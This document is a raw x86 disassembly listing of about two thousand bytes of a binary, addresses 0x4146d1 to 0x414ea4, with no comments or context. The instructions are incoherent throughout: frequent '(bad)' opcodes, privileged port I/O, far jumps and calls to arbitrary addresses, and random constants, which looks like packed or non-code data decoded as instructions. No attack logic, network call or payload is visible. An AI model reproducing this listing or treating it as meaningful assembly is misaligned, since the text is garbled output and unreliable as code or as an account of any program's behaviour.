  4146d1:	imul   eax,DWORD PTR [edi-0x16],0x568111a8
  4146d8:	and    al,0x3c
  4146da:	push   ecx
  4146db:	xchg   DWORD PTR [ebx-0x4f],esi
  4146de:	jo     0x4146aa
  4146e0:	push   ss
  4146e1:	ja     0x4146c5
  4146e3:	mov    WORD PTR [ecx+0x644d64e3],cs
  4146e9:	nop
  4146ea:	push   ebx
  4146eb:	pop    ss
  4146ec:	sub    al,0x45
  4146ee:	(bad)  
  4146ef:	jns    0x414741
  4146f1:	jl     0x414675
  4146f3:	shr    BYTE PTR ds:0x91b93efd,0xd3
  4146fa:	xchg   BYTE PTR [ebp-0x287dc065],bl
  414700:	aaa    
  414701:	imul   ecx,DWORD PTR [ecx+ebx*8-0x44],0xffffffee
  414706:	retf   0xe637
  414709:	pop    ebx
  41470a:	jo     0x4146cc
  41470c:	in     al,dx
  41470d:	jnp    0x4146c9
  41470f:	adc    bh,al
  414711:	dec    BYTE PTR [eax+0x784118ed]
  414717:	pop    esi
  414718:	dec    eax
  414719:	shl    ebp,cl
  41471b:	or     eax,0x6b90e3c0
  414720:	cmp    esp,DWORD PTR [eiz*2+0x18e71809]
  414727:	ss push ecx
  414729:	out    0xd6,al
  41472b:	sub    ebx,DWORD PTR [edx+ebp*8]
  41472e:	pusha  
  41472f:	dec    esp
  414730:	sbb    al,0x33
  414732:	pushf  
  414733:	mov    edi,0xe98d3f0d
  414738:	mov    ebx,0x4c785d1f
  41473d:	mov    edx,0xf9a1691c
  414742:	icebp  
  414743:	popa   
  414744:	cmp    edx,DWORD PTR [edi+0xd]
  414747:	add    DWORD PTR [esi+ebx*1+0x1d2dd311],eax
  41474e:	cli    
  41474f:	stos   BYTE PTR es:[edi],al
  414750:	out    0x64,al
  414752:	retf   
  414753:	fcmovbe st,st(1)
  414755:	pop    ebx
  414756:	(bad)  
  414757:	push   edi
  414758:	std    
  414759:	sar    DWORD PTR [edi+0x3d8b7fcb],1
  41475f:	mov    DWORD PTR [ebp+0x1181463d],ebp
  414765:	xchg   BYTE PTR [edx],cl
  414767:	xor    al,ah
  414769:	neg    DWORD PTR [esi+eax*1+0x2c]
  41476d:	jb     0x4147cb
  41476f:	lock (bad) 
  414771:	jg     0x4147dd
  414773:	lea    esi,[ebx]
  414775:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414776:	or     bl,ch
  414778:	jae    0x414753
  41477a:	popa   
  41477b:	sub    dl,BYTE PTR [ecx]
  41477d:	das    
  41477e:	shr    edx,0x49
  414781:	jmp    0xc3e99e60
  414786:	sbb    eax,esi
  414788:	(bad)  
  414789:	aam    0xe3
  41478b:	mov    es,WORD PTR [ebp+0x7c488943]
  414791:	sub    edi,eax
  414793:	xlat   BYTE PTR ds:[ebx]
  414794:	imul   esi,DWORD PTR [esi],0xa6634242
  41479a:	push   0x38e5e476
  41479f:	cmp    eax,0x21caaf12
  4147a4:	ret    0x2fbe
  4147a7:	mov    ch,cl
  4147a9:	xor    eax,0xb4ae7010
  4147ae:	inc    DWORD PTR [edi]
  4147b0:	mov    ah,0x8d
  4147b2:	lock mov ds:0xbe416688,al
  4147b8:	pop    edi
  4147b9:	add    eax,0x9c84835
  4147be:	(bad)  
  4147bf:	mov    bl,BYTE PTR gs:0x577dc7e
  4147c6:	push   ds
  4147c7:	or     BYTE PTR [ebp+0x3d],cl
  4147ca:	xchg   edi,eax
  4147cb:	mov    esi,0xc5141f71
  4147d0:	sahf   
  4147d1:	mov    dl,0x92
  4147d3:	xor    ebp,DWORD PTR [edi+0x435c7949]
  4147d9:	in     al,dx
  4147da:	lds    ebp,FWORD PTR [ebp-0x79]
  4147dd:	ins    BYTE PTR es:[edi],dx
  4147de:	or     BYTE PTR [eax-0x53],bl
  4147e1:	cli    
  4147e2:	mov    bh,0xe0
  4147e4:	out    dx,al
  4147e5:	jecxz  0x414774
  4147e7:	and    BYTE PTR [edx+0x41],dh
  4147ea:	mov    edx,DWORD PTR [ebx]
  4147ec:	retf   0xa117
  4147ef:	(bad)  
  4147f0:	ins    BYTE PTR es:[edi],dx
  4147f1:	or     esi,edx
  4147f3:	push   ss
  4147f4:	jnp    0x414787
  4147f6:	pop    DWORD PTR [edi+eiz*8-0x22]
  4147fa:	in     al,dx
  4147fb:	cld    
  4147fc:	fcomp  QWORD PTR [ebp+0x725f7c27]
  414802:	mov    ds:0x3a387133,al
  414807:	fwait
  414808:	dec    ecx
  414809:	or     bh,BYTE PTR [ebp+0x6a]
  41480c:	popa   
  41480d:	in     eax,dx
  41480e:	enter  0xb7c5,0x64
  414812:	fcom   QWORD PTR [edi]
  414814:	ret    
  414815:	jp     0x414861
  414817:	idiv   BYTE PTR [ebp+0x57]
  41481a:	xor    al,0x28
  41481c:	mov    DWORD PTR [edi+0x79],ebp
  41481f:	xor    BYTE PTR [eax],0xa4
  414822:	pop    esi
  414823:	(bad)  
  414824:	cmp    BYTE PTR [eax],dl
  414826:	sahf   
  414827:	cmp    bl,BYTE PTR [ecx+0x4cf7567f]
  41482d:	inc    eax
  41482e:	rcr    DWORD PTR [ebp-0x5cdc4ca0],0x9b
  414835:	pop    edi
  414836:	js     0x4147c7
  414838:	and    ah,BYTE PTR [eax+0x41]
  41483b:	pop    ds
  41483c:	cld    
  41483d:	pop    edi
  41483e:	or     BYTE PTR [ecx+0x35e8c8b3],al
  414844:	jl     0x4147d9
  414846:	in     al,dx
  414847:	sar    BYTE PTR ds:0xbfa72f3b,1
  41484d:	add    dl,0x42
  414850:	or     DWORD PTR [eax+0x3a],ecx
  414853:	hlt    
  414854:	jp     0x4148c7
  414856:	repnz stos BYTE PTR es:[edi],al
  414858:	mov    dh,0x12
  41485a:	dec    esi
  41485b:	out    dx,eax
  41485c:	loope  0x414845
  41485e:	fidiv  WORD PTR [esi+0x20]
  414861:	and    BYTE PTR [edx-0x18a9a868],0x77
  414868:	(bad)
  41486b:	je     0x4147f6
  41486d:	jb     0x41484c
  41486f:	xchg   DWORD PTR [edx+ebp*8+0x3b],ebp
  414873:	or     BYTE PTR [edi-0x1],0xf8
  414877:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414878:	mov    ebp,0x86ebc4f4
  41487d:	cmp    al,0x20
  41487f:	sub    esi,DWORD PTR [edx+ebx*4]
  414882:	bound  esp,QWORD PTR [edx+0x33]
  414885:	mov    DWORD PTR [esi-0x41],0x555dcf95
  41488c:	xchg   edi,eax
  41488d:	repnz inc ebp
  41488f:	les    edi,FWORD PTR [esi-0x70]
  414892:	int3   
  414893:	pop    ds
  414894:	nop
  414895:	sub    bh,BYTE PTR [edi]
  414897:	mov    cl,0x32
  414899:	sti    
  41489a:	dec    ebp
  41489b:	push   edi
  41489c:	add    eax,0xbfcbdcc6
  4148a1:	out    0x79,eax
  4148a3:	dec    esi
  4148a4:	jae    0x4148f9
  4148a6:	pop    esp
  4148a7:	cmp    cl,BYTE PTR [eax]
  4148a9:	push   ebx
  4148aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4148ab:	push   ss
  4148ac:	jmp    0x72881739
  4148b1:	in     al,dx
  4148b2:	pop    ds
  4148b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4148b4:	pop    DWORD PTR [ebx-0x3f39b712]
  4148ba:	add    DWORD PTR [ebx-0x7a],0x4f
  4148be:	ss sbb al,0x90
  4148c1:	xor    ch,BYTE PTR [ebp-0x6a]
  4148c4:	pop    ecx
  4148c5:	cs mov cl,0xae
  4148c8:	sbb    eax,0x93754d02
  4148cd:	sbb    esi,0x619d4d33
  4148d3:	xchg   edx,eax
  4148d4:	pop    edi
  4148d5:	dec    ebp
  4148d6:	inc    esi
  4148d7:	jne    0x414877
  4148d9:	xor    BYTE PTR [ebp-0x651e2094],bl
  4148df:	add    BYTE PTR [edi],bh
  4148e1:	xchg   ecx,eax
  4148e2:	bound  edi,QWORD PTR [esi+edx*2]
  4148e5:	push   edi
  4148e6:	and    DWORD PTR ds:0x9145d0da,0x42c4a973
  4148f0:	loop   0x414894
  4148f2:	outs   dx,DWORD PTR ds:[esi]
  4148f3:	dec    esp
  4148f4:	mov    edi,0xd97c4f8b
  4148f9:	dec    eax
  4148fa:	fdivr  DWORD PTR [ecx+0x58]
  4148fd:	mov    ah,0xfa
  4148ff:	push   esp
  414900:	xor    al,0xe6
  414902:	pop    ss
  414903:	(bad)  
  414904:	cwde   
  414905:	jnp    0x414930
  414907:	mov    edi,0x449aa926
  41490c:	jo     0x4148dd
  41490e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41490f:	in     eax,dx
  414910:	dec    ebx
  414911:	hlt    
  414912:	sub    BYTE PTR [ebp+0x1b],dh
  414915:	mov    ebp,0x53490a09
  41491a:	repnz mov edi,DWORD PTR [edx-0x4043a2b5]
  414921:	sbb    eax,0x700f77c2
  414926:	inc    ebp
  414927:	and    al,0x93
  414929:	pop    edx
  41492a:	clc    
  41492b:	xor    ebx,DWORD PTR [edi+0x9]
  41492e:	add    esi,DWORD PTR [esi-0x28]
  414931:	adc    eax,esi
  414933:	cli    
  414934:	(bad)  
  414936:	mov    edx,0xb39e4100
  41493b:	mov    cl,0x23
  41493d:	sbb    eax,0xe90b8995
  414942:	mov    dl,0x2
  414944:	stos   DWORD PTR es:[edi],eax
  414945:	sub    dl,BYTE PTR [edi+0x712d099e]
  41494b:	les    ebx,FWORD PTR cs:[ebx]
  41494e:	mov    ds,WORD PTR [esi+0x57]
  414951:	or     esi,0x4
  414954:	repnz aad 0x4f
  414957:	inc    esi
  414958:	cld    
  414959:	and    edi,DWORD PTR [ebp-0x29dbbbcb]
  41495f:	pop    ebp
  414960:	push   0x648c30a9
  414965:	aaa    
  414966:	stc    
  414967:	sahf   
  414968:	imul   edx,edi,0x936f07da
  41496e:	ja     0x4149c7
  414970:	sahf   
  414971:	xor    eax,0xb8a02c94
  414976:	loope  0x414960
  414978:	repnz push 0xffffff99
  41497b:	shl    eax,0x15
  41497e:	ror    DWORD PTR [esi],0xe8
  414981:	or     eax,0x550e5b44
  414986:	mov    esp,DWORD PTR [eax+ebx*1-0x1806715f]
  41498d:	mov    ds:0xf01fe9c3,al
  414992:	fiadd  WORD PTR [ebp+edx*8+0x65]
  414996:	sub    DWORD PTR ds:[ebx+edi*1+0x3962b066],0xfffffff6
  41499f:	mov    dl,0x89
  4149a1:	jbe    0x41499c
  4149a3:	cmp    BYTE PTR [ebx+0x7184c75f],dl
  4149a9:	xor    ebp,edx
  4149ab:	mov    edx,DWORD PTR [ebp-0x1]
  4149ae:	lds    esi,FWORD PTR ds:0xe6959844
  4149b4:	arpl   WORD PTR [eax],ax
  4149b6:	push   edi
  4149b7:	and    DWORD PTR [edi-0x43],0x2d
  4149bb:	mov    bl,0x24
  4149bd:	pop    edi
  4149be:	mov    ds:0x27bd4a5a,al
  4149c3:	ins    BYTE PTR es:[edi],dx
  4149c4:	cmp    al,0x89
  4149c6:	ds repz mov edx,0x2d388347
  4149cd:	sub    al,0xc7
  4149cf:	jmp    0xfbc8:0x37835ffa
  4149d6:	call   0x57a2523e
  4149db:	ja     0x414985
  4149dd:	xchg   edx,eax
  4149de:	mov    BYTE PTR [eax-0x2d],0x40
  4149e2:	fcom   DWORD PTR [edi-0x46bf23b5]
  4149e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4149e9:	jbe    0x4149fb
  4149eb:	out    dx,al
  4149ec:	lds    ebp,FWORD PTR [edi-0x68dd16d4]
  4149f2:	loopne 0x414a4f
  4149f4:	out    0x10,al
  4149f6:	mov    esi,0x294f92f
  4149fb:	iret   
  4149fc:	fdiv   DWORD PTR [edx+0x35ad5d05]
  414a02:	pop    edi
  414a03:	stc    
  414a04:	sbb    DWORD PTR [ebx+eax*4],ebx
  414a07:	das    
  414a08:	pushf  
  414a09:	in     al,dx
  414a0a:	js     0x4149c7
  414a0c:	mov    ecx,0x287fba47
  414a11:	lods   eax,DWORD PTR ds:[esi]
  414a12:	mov    WORD PTR [edi],ds
  414a14:	and    ch,al
  414a16:	(bad)  
  414a18:	jge    0x4149ba
  414a1a:	mov    bl,0x94
  414a1c:	mov    es,WORD PTR [edx+ebx*1-0x5516181e]
  414a23:	adc    esi,DWORD PTR [ebp+edi*4+0x8cbc6f]
  414a2a:	call   0x5175b9b2
  414a2f:	add    al,0xfd
  414a31:	pop    edi
  414a32:	rcr    DWORD PTR [esi-0x5e00bad7],0x9d
  414a39:	lahf   
  414a3a:	pop    esp
  414a3b:	imul   ecx,esi,0x19
  414a3e:	and    DWORD PTR [eax],esi
  414a40:	cld    
  414a41:	inc    ebp
  414a42:	mov    esi,0x8f61444b
  414a47:	xchg   DWORD PTR [ecx-0x58e8be67],eax
  414a4d:	test   DWORD PTR [esi],edx
  414a4f:	icebp  
  414a50:	mov    bl,0x75
  414a52:	test   eax,0xbaabe86
  414a57:	cdq    
  414a58:	fdivp  st(5),st
  414a5a:	mov    eax,ds:0xd22871f6
  414a5f:	dec    edi
  414a60:	jno    0x414a8a
  414a62:	sub    al,0xe8
  414a64:	pop    ss
  414a65:	and    eax,0xc24c4ac6
  414a6a:	push   ss
  414a6b:	xchg   DWORD PTR [eax+edx*4],ebx
  414a6e:	mov    eax,ds:0x50ffbe21
  414a73:	je     0x414a5f
  414a75:	ss push edi
  414a77:	sbb    dh,BYTE PTR [ebx+eiz*8]
  414a7a:	adc    DWORD PTR [esi-0x31f52a1a],0x9dc54903
  414a84:	rcl    DWORD PTR [edx-0x29],cl
  414a87:	out    dx,eax
  414a88:	xchg   esi,eax
  414a89:	cmp    DWORD PTR [edi-0x6ba20f88],eax
  414a8f:	mov    edi,0xc5e1fbb2
  414a94:	inc    eax
  414a95:	inc    edx
  414a96:	inc    eax
  414a97:	inc    edx
  414a98:	js     0x414a85
  414a9a:	enter  0x4b7e,0x7a
  414a9e:	or     eax,edx
  414aa0:	ror    cl,1
  414aa2:	mov    dl,0x34
  414aa4:	pop    edi
  414aa5:	and    ebx,eax
  414aa7:	stos   BYTE PTR es:[edi],al
  414aa8:	pushf  
  414aa9:	lods   al,BYTE PTR ds:[esi]
  414aaa:	mov    ch,ah
  414aac:	inc    esi
  414aad:	in     eax,0xe4
  414aaf:	mov    DWORD PTR [eax-0x19],edi
  414ab2:	sub    al,0x1c
  414ab4:	daa    
  414ab5:	and    al,0x70
  414ab7:	jmp    0x414a6f
  414ab9:	lods   al,BYTE PTR ds:[esi]
  414aba:	test   DWORD PTR ds:0x1e113ed5,0x3091cb73
  414ac4:	fucom  st(5)
  414ac6:	mov    bl,0xce
  414ac8:	push   esi
  414ac9:	push   ebx
  414aca:	rol    DWORD PTR [esi+0x23],1
  414acd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ace:	jmp    0x414b07
  414ad0:	mov    eax,0x32227bbc
  414ad5:	call   0xc3044ab4
  414ada:	mov    BYTE PTR [eax+eax*8-0x2c],ah
  414ade:	adc    ch,dl
  414ae0:	mov    edx,0xd2fb566e
  414ae5:	addr16 mov dl,0xc1
  414ae8:	cwde   
  414ae9:	cmp    dh,bh
  414aeb:	sbb    ebp,DWORD PTR [esp+edi*8-0x19d8c57c]
  414af2:	push   ebx
  414af3:	sbb    al,0x9b
  414af5:	push   eax
  414af6:	cs addr16 cs inc esp
  414afa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414afb:	ds dec ecx
  414afd:	jge    0x414b0c
  414aff:	fcmovbe st,st(5)
  414b01:	jo     0x414aed
  414b03:	or     ecx,eax
  414b05:	(bad)  
  414b06:	in     al,0x6b
  414b08:	mov    ecx,esi
  414b0a:	(bad)  
  414b0b:	and    edi,DWORD PTR ss:[esi+esi*1]
  414b0f:	lahf   
  414b10:	aas    
  414b11:	add    edx,edi
  414b13:	pop    es
  414b14:	data16 rcr BYTE PTR [edi+0x48da4d03],1
  414b1b:	mov    al,ds:0xffbc21ef
  414b20:	inc    eax
  414b21:	push   DWORD PTR [edi]
  414b23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b24:	fld    DWORD PTR [ebp-0x27]
  414b27:	gs pop edi
  414b29:	stos   BYTE PTR es:[edi],al
  414b2a:	sti    
  414b2b:	mov    al,0x37
  414b2d:	mov    cl,0x3f
  414b2f:	ret    
  414b30:	push   esp
  414b31:	js     0x414ae2
  414b33:	mov    ch,0x6d
  414b35:	lods   al,BYTE PTR ds:[esi]
  414b36:	shl    DWORD PTR es:[edi+0xa1187e9],1
  414b3d:	mov    dh,0x34
  414b3f:	das    
  414b40:	dec    esi
  414b41:	dec    esp
  414b42:	shl    DWORD PTR [ebx-0x51bc5a4],0x2
  414b49:	lahf   
  414b4a:	aaa    
  414b4b:	xchg   edi,eax
  414b4c:	outs   dx,BYTE PTR ds:[esi]
  414b4d:	in     al,dx
  414b4e:	xor    ebx,DWORD PTR [edi-0x35549b3f]
  414b54:	lahf   
  414b55:	sub    ch,BYTE PTR [esi]
  414b57:	sbb    al,0x37
  414b59:	jbe    0x414b31
  414b5b:	cmp    eax,0xb757075c
  414b60:	cmp    ch,bl
  414b62:	(bad)  
  414b63:	pop    ecx
  414b64:	and    bl,BYTE PTR ds:0x4ce8f75b
  414b6a:	test   al,0x8
  414b6c:	hlt    
  414b6d:	add    DWORD PTR [esp+esi*8+0x24],ecx
  414b71:	stos   DWORD PTR es:[edi],eax
  414b72:	ficom  DWORD PTR [esp+esi*8+0x61]
  414b76:	cmp    DWORD PTR [eax],ebp
  414b78:	outs   dx,BYTE PTR ds:[esi]
  414b79:	and    BYTE PTR [ecx+0x3443b05a],dl
  414b7f:	push   edx
  414b80:	add    al,0x9d
  414b82:	nop
  414b83:	sahf   
  414b84:	into   
  414b85:	retf   0x2aec
  414b88:	or     eax,0xf5fea248
  414b8d:	or     eax,0x38e0633c
  414b92:	or     eax,0xbf5d1b89
  414b97:	inc    ebp
  414b98:	cwde   
  414b99:	fldenv [edi]
  414b9b:	lock shl BYTE PTR [esi+ecx*4],0x81
  414ba0:	xchg   ebp,eax
  414ba1:	inc    esi
  414ba2:	jnp    0x414c1b
  414ba4:	fdiv   DWORD PTR [ebx]
  414ba6:	lahf   
  414ba7:	pushf  
  414ba8:	ja     0x414b5a
  414baa:	lahf   
  414bab:	dec    edi
  414bac:	test   BYTE PTR [ebx],ch
  414bae:	push   esi
  414baf:	cwde   
  414bb0:	ins    DWORD PTR es:[edi],dx
  414bb1:	test   edi,ebx
  414bb3:	sahf   
  414bb4:	adc    DWORD PTR [ebx],esp
  414bb6:	data16 mov ds:0x48418db,al
  414bbc:	push   esi
  414bbd:	outs   dx,BYTE PTR ds:[esi]
  414bbe:	pop    es
  414bbf:	es pop es
  414bc1:	add    al,0x6a
  414bc4:	loope  0x414b59
  414bc6:	pop    ebx
  414bc7:	mov    ?,WORD PTR [ebx]
  414bc9:	arpl   WORD PTR [ebp-0x5f2e4cec],cx
  414bcf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414bd0:	stos   DWORD PTR es:[edi],eax
  414bd1:	xor    DWORD PTR [edx],0xd443d9e5
  414bd7:	repz leave 
  414bd9:	and    eax,0x104eb4ba
  414bde:	mov    cs,WORD PTR [ecx-0x19]
  414be1:	jbe    0x414b82
  414be3:	mov    ebp,0xf22c5a4a
  414be8:	xor    BYTE PTR [esp+ebx*1-0x1fc513be],0xce
  414bf0:	clc    
  414bf1:	add    ebp,DWORD PTR [ebx]
  414bf3:	mov    eax,0xc2c590b3
  414bf8:	aad    0x6f
  414bfa:	pop    edx
  414bfb:	mov    bh,0x73
  414bfd:	not    DWORD PTR [eax+edx*1-0x56]
  414c01:	mov    dh,0xca
  414c03:	test   eax,0x62a08501
  414c08:	inc    ebx
  414c09:	sbb    eax,0x59afb7bf
  414c0e:	gs pop ecx
  414c10:	push   es
  414c11:	sub    DWORD PTR cs:[ebx-0x4b49a859],0xfb0d1b86
  414c1c:	inc    edx
  414c1d:	ficomp DWORD PTR ds:0x514e4955
  414c23:	out    dx,eax
  414c24:	add    ecx,DWORD PTR [edi-0x1b]
  414c27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c28:	jg     0x414c6d
  414c2a:	ins    BYTE PTR es:[edi],dx
  414c2b:	loop   0x414c19
  414c2d:	inc    edx
  414c2e:	push   ss
  414c2f:	push   ebx
  414c30:	sub    al,0x66
  414c32:	hlt    
  414c33:	sbb    BYTE PTR [ecx+eiz*8],0x26
  414c37:	adc    esi,DWORD PTR [esi+0x77]
  414c3a:	mov    BYTE PTR [edi+0x66bc1de9],bl
  414c40:	out    0x63,al
  414c42:	icebp  
  414c43:	cmp    al,bl
  414c45:	in     al,dx
  414c46:	in     al,0xe3
  414c48:	js     0x414c69
  414c4a:	adc    al,0x44
  414c4c:	gs sub eax,0xff7baa8f
  414c52:	jo     0x414bd6
  414c54:	rol    bh,1
  414c56:	push   ecx
  414c57:	int    0xf7
  414c59:	jbe    0x414cd0
  414c5b:	pop    edi
  414c5c:	in     al,0xca
  414c5e:	and    ecx,DWORD PTR [ebx+0x24]
  414c61:	and    ebp,esp
  414c63:	push   0xffffff8d
  414c65:	(bad)  [edx]
  414c67:	sub    DWORD PTR [ecx+0x15],ebx
  414c6a:	sti    
  414c6b:	cli    
  414c6c:	push   ebx
  414c6d:	or     eax,DWORD PTR [eax+ecx*4-0x77fc5611]
  414c74:	adc    ch,ah
  414c76:	aam    0xbd
  414c78:	out    dx,al
  414c79:	cmp    eax,0xe574bd8b
  414c7e:	xor    DWORD PTR ds:0x8deffe7b,edi
  414c84:	jbe    0x414c22
  414c86:	mov    eax,0xfb2e353a
  414c8b:	imul   esp,DWORD PTR [edi],0x94ada05c
  414c91:	mov    eax,esi
  414c93:	fs dec edx
  414c95:	sub    al,0x20
  414c97:	sbb    ah,BYTE PTR [ebx]
  414c99:	(bad)  
  414c9a:	neg    BYTE PTR [ebp+0x72]
  414c9d:	cmp    BYTE PTR [eax],dl
  414c9f:	iret   
  414ca0:	das    
  414ca1:	add    ch,BYTE PTR [ebx-0x3e]
  414ca4:	push   edi
  414ca5:	sbb    BYTE PTR [ecx-0x22a1d55e],bh
  414cab:	cmp    eax,0x19bfb92d
  414cb0:	jle    0x414c72
  414cb2:	loop   0x414ce9
  414cb4:	jmp    0x414c7d
  414cb6:	je     0x414c65
  414cb8:	dec    ebx
  414cb9:	jns    0x414cd1
  414cbb:	lahf   
  414cbc:	pop    edi
  414cbd:	sub    bh,al
  414cbf:	in     al,dx
  414cc0:	xlat   BYTE PTR ds:[ebx]
  414cc1:	pop    ebx
  414cc2:	jo     0x414d09
  414cc4:	ret    
  414cc5:	push   es
  414cc6:	and    BYTE PTR [eax],dl
  414cc8:	sar    esp,cl
  414cca:	jb     0x414ccb
  414ccc:	ficomp WORD PTR [ecx]
  414cce:	inc    edx
  414ccf:	outs   dx,DWORD PTR ds:[esi]
  414cd0:	xlat   BYTE PTR ds:[ebx]
  414cd1:	mov    ebx,0x35e24a78
  414cd6:	pop    eax
  414cd7:	sub    al,0xd9
  414cd9:	aas    
  414cda:	mov    bh,0x9f
  414cdc:	xor    BYTE PTR [edi-0x4403291],0x1d
  414ce3:	mov    bh,0xb3
  414ce5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ce6:	rol    BYTE PTR [ecx+ebx*1-0x573a1b7],cl
  414ced:	popa   
  414cee:	retf   0x104b
  414cf1:	xor    bl,BYTE PTR [ecx]
  414cf3:	pop    ds
  414cf4:	fsub   DWORD PTR [edi]
  414cf6:	pop    esi
  414cf7:	jbe    0x414cd4
  414cf9:	push   ds
  414cfa:	sbb    BYTE PTR [edi+edx*2],bl
  414cfd:	ret    
  414cfe:	outs   dx,BYTE PTR ds:[esi]
  414cff:	dec    BYTE PTR [edi+0x5e]
  414d02:	add    BYTE PTR [esi-0x7b0a6370],ah
  414d08:	andps  xmm5,XMMWORD PTR [edx-0x61ee47c5]
  414d0f:	add    esp,DWORD PTR [edi-0x636ac931]
  414d15:	mov    bl,0x95
  414d17:	jb     0x414c9a
  414d19:	int3   
  414d1a:	test   al,0xf6
  414d1c:	bound  edi,QWORD PTR [ecx-0x360d6a91]
  414d22:	loope  0x414d47
  414d24:	mov    ds:0x52dba31e,al
  414d29:	or     DWORD PTR [ebp+0x65],eax
  414d2c:	jo     0x414d82
  414d2e:	ds call 0x67be:0x2e15f53
  414d36:	je     0x414cd3
  414d38:	push   0x613cf6f9
  414d3d:	lods   al,BYTE PTR ds:[esi]
  414d3e:	shl    dl,cl
  414d40:	sub    BYTE PTR [ecx],ch
  414d42:	leave  
  414d43:	in     al,0x6e
  414d45:	mov    DWORD PTR [edi-0x67],edi
  414d48:	stos   BYTE PTR es:[edi],al
  414d49:	mov    fs,WORD PTR ds:0x2a2a66ba
  414d4f:	pop    ecx
  414d50:	mov    dh,0x8f
  414d52:	fdivr  DWORD PTR [ecx+eax*2-0x75dd6c4e]
  414d59:	inc    ecx
  414d5a:	outs   dx,DWORD PTR ds:[esi]
  414d5b:	jbe    0x414d12
  414d5d:	jns    0x414dc3
  414d5f:	mov    BYTE PTR [edx+ecx*4+0x1adb0e68],dh
  414d66:	fnsave [eax-0x1b]
  414d69:	add    DWORD PTR [esi+edi*8+0x57],eax
  414d6d:	fnstcw WORD PTR [ebx+0x1bcd2a75]
  414d73:	test   BYTE PTR ds:0x55750930,dh
  414d79:	mov    edi,DWORD PTR [ecx+0x271db601]
  414d7f:	pushf  
  414d80:	jmp    0x58113f0d
  414d85:	lds    edi,FWORD PTR [edi]
  414d87:	xor    eax,0xe0bdd2c
  414d8c:	dec    ecx
  414d8d:	mov    ebp,0xa39caa32
  414d92:	xor    DWORD PTR [ebp+ecx*8+0x38cdf13f],esi
  414d99:	push   esp
  414d9a:	rcl    edx,cl
  414d9c:	iret   
  414d9d:	into   
  414d9e:	sub    ch,BYTE PTR [ebp-0x55df4265]
  414da4:	push   ss
  414da5:	stos   BYTE PTR es:[edi],al
  414da6:	pop    edx
  414da7:	idiv   ebx
  414da9:	pop    eax
  414daa:	adc    edi,ebp
  414dac:	mov    esp,0xc093e00b
  414db1:	push   ebp
  414db2:	adc    DWORD PTR [esi-0x62],0x2d0405d
  414db9:	ror    ch,0x74
  414dbc:	dec    ecx
  414dbd:	(bad)  
  414dbe:	dec    ecx
  414dbf:	adc    al,0xd9
  414dc1:	popa   
  414dc2:	dec    esi
  414dc3:	fsub   QWORD PTR [eax]
  414dc5:	scas   al,BYTE PTR es:[edi]
  414dc6:	xchg   esi,eax
  414dc7:	mov    dl,0xae
  414dc9:	xchg   ebx,eax
  414dca:	out    dx,al
  414dcb:	cs int 0x39
  414dce:	daa    
  414dcf:	cmp    BYTE PTR ds:0xd8e1dd9d,dh
  414dd5:	rcr    edi,cl
  414dd7:	add    edx,ecx
  414dd9:	sbb    eax,0xc22b7adf
  414dde:	test   BYTE PTR [esi+0x2639645],ch
  414de4:	sbb    ah,BYTE PTR [ecx+0xb60dfd3]
  414dea:	jl     0x414e0b
  414dec:	repz xchg bl,bh
  414def:	(bad)  
  414df0:	ins    DWORD PTR es:[edi],dx
  414df1:	popa   
  414df2:	mov    ds:0x1734c1ec,al
  414df7:	add    eax,0xb05eeff
  414dfc:	or     DWORD PTR [edi+0x57],ebp
  414dff:	out    dx,eax
  414e00:	rcr    DWORD PTR [ebx+0x2793ac4],cl
  414e06:	sub    eax,DWORD PTR [edi+edx*2]
  414e09:	int    0x93
  414e0b:	lds    esi,FWORD PTR [eax]
  414e0d:	lahf   
  414e0e:	and    eax,0xdaf2db9f
  414e13:	cmc    
  414e14:	xchg   esp,eax
  414e15:	xor    ecx,esi
  414e17:	xor    eax,0x8a89835
  414e1c:	scas   eax,DWORD PTR es:[edi]
  414e1d:	jo     0x414dcc
  414e1f:	dec    edi
  414e20:	pop    ss
  414e21:	mov    cs,WORD PTR [esi]
  414e23:	jne    0x414db2
  414e25:	cmova  eax,DWORD PTR [esi+0x18]
  414e29:	test   BYTE PTR [esi-0xb48dd44],0x4d
  414e30:	inc    ecx
  414e31:	push   ss
  414e32:	add    eax,0xc8d673a3
  414e37:	jae    0x414dbf
  414e39:	out    dx,eax
  414e3a:	or     cl,bl
  414e3c:	mov    edi,0x2220e521
  414e41:	cmp    eax,0x8b8951e1
  414e46:	and    bl,BYTE PTR [ebx-0xb]
  414e49:	stos   DWORD PTR es:[edi],eax
  414e4a:	xlat   BYTE PTR fs:[ebx]
  414e4c:	dec    edi
  414e4d:	jb     0x414e1c
  414e4f:	lods   al,BYTE PTR ds:[si]
  414e51:	push   ss
  414e52:	and    BYTE PTR [esi],dl
  414e54:	mov    edi,0xdf9f4bb5
  414e59:	daa    
  414e5a:	les    edx,FWORD PTR [ebp+0x35a36a47]
  414e60:	cld    
  414e61:	inc    eax
  414e62:	sub    edx,DWORD PTR [eax]
  414e64:	inc    esi
  414e65:	add    BYTE PTR [edx-0x8a6055a],bl
  414e6b:	pop    esp
  414e6c:	mov    cl,0x98
  414e6e:	jl     0x414e93
  414e70:	xor    eax,0x17bbdffe
  414e75:	loope  0x414ed2
  414e77:	push   ebx
  414e78:	fidiv  WORD PTR [edi+0x4c]
  414e7b:	adc    DWORD PTR [eax+0x7b98bc72],0x6367132b
  414e85:	xor    BYTE PTR [eax+0x59],0x58
  414e89:	mov    edi,0x7c3ecf6a
  414e8e:	dec    edx
  414e8f:	imul   esp,DWORD PTR [eax-0x6c4c3445],0x877cfe18
  414e99:	dec    ecx
  414e9a:	mov    esp,0x6b8a14ad
  414e9f:	xlat   BYTE PTR ds:[ebx]
  414ea0:	sub    BYTE PTR [ecx],ch
  414ea2:	push   es
  414ea3:	inc    esi
  414ea4:	data16 mov cl,BYTE PTR [eax-0x401d8e7b]
